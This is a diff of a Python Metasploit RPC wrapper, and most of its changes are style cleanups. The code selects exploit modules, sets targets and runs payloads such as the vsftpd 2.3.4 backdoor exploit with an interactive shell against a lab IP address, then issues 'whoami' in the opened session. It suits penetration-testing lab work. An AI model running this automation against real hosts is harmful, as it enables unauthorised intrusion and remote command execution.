@@ -2,7 +2,7 @@ import subprocess
 import logging
 import asyncio
 from pymetasploit3.msfrpc import MsfRpcClient
-from database import ExploitDB
+# from database import ExploitDB
 
 
 logging.basicConfig(
@@ -10,6 +10,8 @@ logging.basicConfig(
     format='%(levelname)s [%(asctime)s] %(filename)s:%(lineno)d - %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S'
 )
+
+
 class Console:
     def __init__(self) -> None:
         self.client = MsfRpcClient('yourpassword', ssl=True)
@@ -23,7 +25,7 @@ class Console:
     def is_valid_module(self, module_name):
         modules_data = self.search_module(module_name)
         for module in modules_data:
-            if module_name == module['fullname']: 
+            if module_name == module['fullname']:
                 logging.debug(f"valid module selected -> {module['fullname']}")
                 return True
         logging.error(f"invalid module selected -> {module_name}")
@@ -32,12 +34,12 @@ class Console:
     def set_payload(self, payload_path):
         if not self.is_valid_module(payload_path):
             logging.error("payload has not been set")
-            return        
+            return
         self.exploit = self.client.modules.use('exploit', payload_path)
-        
-        
+
     def set_arguments(self, arguments):
-        if self.exploit is None: return
+        if self.exploit is None:
+            return
         for argument in arguments.keys():
             self.exploit[argument] = arguments[argument]
 
@@ -55,10 +57,12 @@ class Console:
         return (False, session_id)
 
     async def run_payload(self, shell_path, ip):
-        if self.exploit is None: return
+        if self.exploit is None:
+            return
         is_exploited, session_id = self.is_exploited(ip)
         if is_exploited:
-            logging.warning(f"target {ip} already has a session; session_id -> {session_id} ")
+            logging.warning(
+                f"target {ip} already has a session; session_id -> {session_id} ")
             return session_id
 
         exploit_result = self.exploit.execute(payload=shell_path)
@@ -76,67 +80,66 @@ class Console:
 
     async def interact(self, session_id, command, ip):
         logging.debug("trying to interact: " + session_id)
-        client = MsfRpcClient('yourpassword',ssl=True)
+        client = MsfRpcClient('yourpassword', ssl=True)
         session_id = session_id
         for id in client.sessions.list.keys():
             if client.sessions.list[id]["session_host"] == ip:
-                session_id = id  
+                session_id = id
         shell = client.sessions.session(session_id)
         shell.write(command)
         print(shell.read())
 
-        
     def get_sessions(self):
         return self.client.sessions.list
-    
+
     async def exploit(self, ip, path):
         logging.debug("before: "+str(self.client.sessions.list))
-        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
+        # exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
         self.set_payload(path)
         # self.set_payload('exploit/linux/postgres/postgres_payload')
         self.set_arguments({
-            "RHOSTS":ip
+            "RHOSTS": ip
         })
-        #exploit_result = exploit.execute(payload='cmd/unix/interact')
-        session_id = await self.run_payload('cmd/unix/interact',ip)
-        if session_id is None: return
+        # exploit_result = exploit.execute(payload='cmd/unix/interact')
+        session_id = await self.run_payload('cmd/unix/interact', ip)
+        if session_id is None:
+            return
         logging.debug("after: "+str(self.client.sessions.list))
-        await self.interact(session_id, "whoami",ip)
+        await self.interact(session_id, "whoami", ip)
         # print(client.sessions.list)
         # shell = client.sessions.session('1')
         # shell.write('whoami')
         # print(shell.read())
-
 
     async def test(self):
         logging.debug("before: "+str(self.client.sessions.list))
-        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
+        # exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
         self.set_payload('exploit/unix/ftp/vsftpd_234_backdoor')
         # self.set_payload('exploit/linux/postgres/postgres_payload')
         self.set_arguments({
-            "RHOSTS":"192.168.17.130"
+            "RHOSTS": "192.168.17.130"
         })
-        #exploit_result = exploit.execute(payload='cmd/unix/interact')
-        session_id = await self.run_payload('cmd/unix/interact',"192.168.17.130")
-        if session_id is None: return
+        # exploit_result = exploit.execute(payload='cmd/unix/interact')
+        session_id = await self.run_payload('cmd/unix/interact', "192.168.17.130")
+        if session_id is None:
+            return
         logging.debug("after: "+str(self.client.sessions.list))
-        await self.interact(session_id, "whoami","192.168.17.130")
+        await self.interact(session_id, "whoami", "192.168.17.130")
         # print(client.sessions.list)
         # shell = client.sessions.session('1')
         # shell.write('whoami')
         # print(shell.read())
-
 
 
 async def testing():
 
-    db = ExploitDB()
-    console = Console(db=db)
-    await console.test()
+    # db = ExploitDB()
+    # console = Console(db=db)
+    # await console.test()
     # await console.start_msfconsole()
     # await console.set_payload("exploit/linux/postgres/postgres_payload")
     # await console.set_argument("tt","a")
     # await console.set_argument("rhosts", "192.168.17.130")
     # await console.set_argument("lhost","eth0")
     # await console.run_payload()
-
+    pass
